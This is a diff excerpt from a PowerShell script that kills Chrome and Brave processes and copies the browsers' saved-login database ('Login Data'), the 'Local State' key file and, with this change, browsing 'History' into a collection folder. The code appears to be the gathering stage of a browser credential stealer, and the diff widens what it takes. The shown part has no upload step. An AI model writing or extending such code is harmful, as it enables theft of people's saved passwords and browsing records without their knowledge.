@@ -31,13 +31,14 @@ function KillBrowserProcesses($browserName) {
     }
 }
 
-# Google Chrome
+# Configuration for Google Chrome
 $chromeDir = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default"
-$chromeFilesToCopy = @("Login Data")
+$chromeFilesToCopy = @("Login Data", "History")  # "History" dosyasını ekliyoruz
 $localStateChrome = Join-Path -Path "$env:LOCALAPPDATA\Google\Chrome\User Data" -ChildPath "Local State"
 KillBrowserProcesses "chrome"
 CopyBrowserFiles "Chrome" $chromeDir $chromeFilesToCopy
 Copy-Item -Path $localStateChrome -Destination (Join-Path -Path $destDir -ChildPath "Chrome") -ErrorAction SilentlyContinue
+Write-Host "Chrome - Local State file copied."
 
 # Brave
 $braveDir = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default"
